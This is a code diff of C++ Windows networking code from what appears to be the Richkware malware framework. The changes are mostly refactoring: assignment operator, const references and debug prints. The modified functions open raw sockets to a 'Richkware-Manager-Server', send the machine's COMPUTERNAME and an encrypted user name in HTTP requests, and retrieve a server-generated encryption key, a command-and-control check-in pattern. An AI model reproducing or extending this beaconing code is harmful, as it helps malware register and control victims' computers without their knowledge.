@@ -26,8 +26,14 @@ Server &Server::operator=(const Server &server) {
     return *this;
 }
 
+// TODO verificare funzionamento del server
+//Network &Network::operator=(const Network &network) = default;
+
 Network &Network::operator=(const Network &network) {
     encryptionKey = network.encryptionKey;
+    serverAddress = network.serverAddress;
+    port = network.port;
+    associatedUser = network.associatedUser;
     server = network.server;
     return *this;
 }
@@ -37,17 +43,17 @@ Network &Network::operator=(const Network &network) {
     server = Server(encryptionKeyArg);
 }*/
 
-Network::Network(const std::string& serverAddressArg, std::string portArg,
-                 const std::string& associatedUserArg,
-                 const std::string& encryptionKeyArg) {
+Network::Network(const std::string &serverAddressArg, const std::string& portArg,
+                 const std::string &associatedUserArg,
+                 const std::string &encryptionKeyArg) {
     serverAddress = serverAddressArg;
     port = portArg;
-    associatedUser =associatedUserArg;
+    associatedUser = associatedUserArg;
     encryptionKey = encryptionKeyArg;
     server = Server(encryptionKeyArg);
 }
 
-std::string Network::RawRequest(const std::string& serverAddress,  const std::string& port,  const std::string& request) {
+std::string Network::RawRequest(const std::string &serverAddress, const std::string &port, const std::string &request) {
     WSADATA wsaData;
     SOCKET ConnectSocket = INVALID_SOCKET;
     struct addrinfo *result = NULL, *ptr = NULL, hints;
@@ -56,6 +62,9 @@ std::string Network::RawRequest(const std::string& serverAddress,  const std::st
     char recvbuf[bufferlength];
     int iResult;
     std::string response;
+
+    //TODO REMOVE
+    std::cout << "RawRequest:" << serverAddress << " " << port << " " << request << std::endl;
 
     // Initialize Winsock
     iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
@@ -161,7 +170,7 @@ Network::UploadInfoToRMS(const std::string &serverAddress, const std::string &po
 
     std::string associatedUserS = crypto.Encrypt(associatedUser);
     // TODO REMOVE
-    std::cout << "associatedUser " << associatedUser << " " << associatedUserS << std::endl;
+    std::cout << "associatedUser: " << associatedUser << " " << associatedUserS << std::endl;
 
     std::string packet = "PUT /Richkware-Manager-Server/device?data0=" + name +
                          "&data1=" + serverPortS +
@@ -171,9 +180,8 @@ Network::UploadInfoToRMS(const std::string &serverAddress, const std::string &po
                          "Connection: close\r\n" +
                          "\r\n";
 
-
     std::string response = RawRequest(serverAddress, port, packet);
-    std::cout<<response<<std::endl;
+    //std::cout<<response<<std::endl;
     return true;
 }
 
@@ -187,7 +195,7 @@ std::string Network::GetEncryptionKeyFromRMS(const std::string &serverAddress, c
     std::string key;
 
     // create a database entry into the Richkware-Manager-Server, to obtain the encryption key server-side generated
-    UploadInfoToRMS(serverAddress, port, associatedUser, "", encryptionKey);
+    UploadInfoToRMS(serverAddress, port, associatedUser, "none", encryptionKey);
 
     // Primary key in RMS database.
     std::string name = getenv("COMPUTERNAME");
@@ -201,7 +209,7 @@ std::string Network::GetEncryptionKeyFromRMS(const std::string &serverAddress, c
                          "Connection: close\r\n" +
                          "\r\n";
 
-    key = RawRequest(serverAddress.c_str(), port.c_str(), packet.c_str());
+    key = RawRequest(serverAddress, port, packet);
     // If no matches were found, the function "find" returns string::npos
     if (key.find('$') != std::string::npos) {
         key = key.substr(key.find('$') + 1, (key.find('#') - key.find('$')) - 1);
